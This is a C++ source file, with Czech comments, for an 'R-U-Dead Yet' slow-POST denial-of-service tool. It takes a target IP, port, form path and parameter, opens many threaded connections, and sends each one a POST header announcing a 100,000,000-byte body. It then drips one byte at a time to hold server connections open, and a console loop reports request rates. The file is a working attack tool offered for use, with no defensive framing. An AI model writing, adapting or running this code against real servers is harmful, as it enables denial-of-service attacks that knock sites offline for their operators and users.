#include <iostream>
#include <cstdlib>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>

using namespace std;

#include "rudy.h"

#define REFRESH_TIME_MS 100
#define REFRESH_CNT     10
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int alive_threads;

pthread_mutex_t mutex_request_cnt = PTHREAD_MUTEX_INITIALIZER;
int request_cnt;

Rudy::Rudy(int argc, char **argv){
	
	int c;
	while ((c = getopt(argc, argv, "d:D:t:c:f:p:P:T:")) != -1) 
	{
		switch (c)
		{
		
		case 'd':
			target = optarg;
			break;
		case 'D':
			port = atoi(optarg);
			break;
		case 't':
			timeout = atoi(optarg);
			break;
		case 'c':
			con_nbr = atoi(optarg);
			break;
		case 'p':
			path = optarg;		// napriklad: /form_action.php ...
			break;
		case 'P':
			param = optarg;		// napriklad: username, login, password ...
			break;
		case 'T':
			duration = atoi(optarg);
			break;
		default:
			break; // zmenit na vypis napovedy
		}
	}
	

	printf("\n*-------------------- R-U-Dead Yet attack starts --------------------*\n"
		"Parameters of attack: \n"
		"Target IP: %s  Port: %d\nPath: %s\nParameter: %s\nTimeout: %d\nNumber of connections: %d\nDuration: %d\n\n"
		//"Generated POST header:\n%s\n\n"
		, target, port, path, param, timeout, con_nbr, duration);
	
	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(target);
	servaddr.sin_port = htons(port);
}

void Rudy::run(){
	pthread_t *threads = new pthread_t[con_nbr];
	int rc;
	int i;
	RudyParams *params = new RudyParams[con_nbr];
	
        alive_threads = con_nbr;
        int request_cnt_old = 0;
        request_cnt = 0;
        
	for( i=0; i < con_nbr; i++ ){
		
		params[i].id = i;
		params[i].servaddr = servaddr;
		params[i].timeout = timeout;		// timeout na vlakno
		params[i].path = path;
		params[i].param = param;
		params[i].target = target;
                params[i].duration = duration;

		rc = pthread_create(&threads[i], NULL, &Rudy::RudyThread, (void*)&params[i]);

		if (rc){ 
			cout << "Error:unable to create thread," << rc << endl;
 			break;
		}
	}
        
	time_t startTime = time(NULL);
                
        while(1){
            time_t curTime = time(NULL);
            if((curTime-startTime)> duration){
                exit(0);
            }
            printf("\rThreads:%8d\tHeaders send: %8d Req/sec: %5d Time:%li sec\t\t\t\t\t", alive_threads, request_cnt,request_cnt-request_cnt_old, curTime-startTime);
            fflush(stdout);
            request_cnt_old = request_cnt;
            usleep(1000000);
        }  
}

void* Rudy::RudyThread(void *threadid){
	usleep(rand() % 100000 + 50000);
	
        struct RudyParams *params;
   	params = (struct RudyParams *) threadid;
	
	char keep_alive[2]="A";
	
	// musel jsem vytvorit hlavicku zde, jinde v programu po spusteni utoku "Segmentation fault"	
	char post_head[1024];
	char header[1024] = "POST %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: 100000000\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n%s="; //path, host, param (attack_parameter)
		
	sprintf(post_head,header,params->path,params->target,params->param); // make header
	//printf("\n%s\n", post_head);  // vypsat sestavenou hlavicku

 	int i;
	int error = 0, errno;
	
        int sock;
        
        int error_cnt = 0;
        
        struct timeval timeout;      
        timeout.tv_sec = 4;
        timeout.tv_usec = 0;
        
        while(1){
                // create connections
                // socket
                if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                        if(error_cnt == REFRESH_CNT){
                            pthread_mutex_lock(&mutex);
                            alive_threads--;                       
                            pthread_mutex_unlock(&mutex);			
                            return NULL;
                        }
                        else{
                            error_cnt++;
                            usleep(REFRESH_TIME_MS*1000);
                            continue;
                        }
                }

/*                if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0){
                    
                }
        

                if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0){
                    
                }                                    
*/                    
                // connect
                if (connect(sock, (SOCKADDR *)&params->servaddr, sizeof(params->servaddr)) == -1) {
                        if(error_cnt == REFRESH_CNT){
                            pthread_mutex_lock(&mutex);
                            alive_threads--;                       
                            pthread_mutex_unlock(&mutex);
                            close(sock);
                            return NULL;
                        }
                        else{
                            error_cnt++;
                            usleep(REFRESH_TIME_MS*1000);
                            continue;
                        }
                }

                // send header
                if (send(sock, post_head, strlen(post_head), 0) < 0) {
                        if(error_cnt == REFRESH_CNT){
                            pthread_mutex_lock(&mutex);
                            alive_threads--;                       
                            pthread_mutex_unlock(&mutex);	
                            close(sock);
                            return NULL;
                        }
                        else{
                            error_cnt++;
                            usleep(REFRESH_TIME_MS*1000);
                            continue;
                        }
                }       

                error_cnt = 0;
                
                //set no blocking
                fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) | O_NONBLOCK);
               
                // sons stay in loop
                while (1) {  
                    
                    // send keep alive
                    if (send(sock , keep_alive, strlen(keep_alive), 0) < 0) {
                        // kvuli no blocking jenom jednou                        
                        close(sock);
                        break;
                    }
                    else {
                         pthread_mutex_lock(&mutex_request_cnt);
                         request_cnt++;
                         pthread_mutex_unlock(&mutex_request_cnt);
                    } 
                    sleep(params->timeout); 
                }   
        }
         
}





        /*
        for(i = 0; i < connPerThread; i++){
	
            // create TCP socket
            if ((sock[i] = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                    perror("socket()");
                    printf("Socket %d: failed to create socket\n", params->id);
                    exit(errno);
            }

            // TCP connect to target
            if (connect(sock[i], (SOCKADDR *)&params->servaddr, sizeof(params->servaddr)) == -1) {
                    perror("connect()");
                    exit(errno);
            }
            else {
                    printf("Socket %d: connected to server\n", params->id);
                    fflush(stdout);
            }

            // send header
            if (send(sock[i], post_head, strlen(post_head), 0) < 0) {
                    perror("send()");
                    exit(errno);
            }
            else {
                    printf("Socket %d: header send\n", params->id);
            }
                     // sons stay in loop
                while (1) {
                        // send small data
                        if (send(sock[i], keep_alive, strlen(keep_alive), 0) < 0) {
                                perror("send()");
                                return(0);
                        }
                        else {
                                printf("Socket %d: keep alive send\n", params->id);

                        }
                        // wait	
                        sleep(params->timeout);
                }
        }
        printf("Exit thread\n");
        close(sock[i]);
        pthread_exit(NULL); 
         */
